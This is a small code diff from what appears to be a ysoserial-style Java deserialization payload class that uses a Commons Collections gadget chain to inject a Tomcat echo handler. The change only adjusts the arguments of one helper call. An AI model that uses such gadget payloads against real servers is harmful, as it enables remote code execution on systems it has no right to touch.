@@ -29,7 +29,7 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsCollections3ForTomcatEchoInject extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String ... command) throws Exception {
-		Object templatesImpl = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);
+		Object templatesImpl = Gadgets.createTemplatesImpl(TomcatEchoInject.class);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
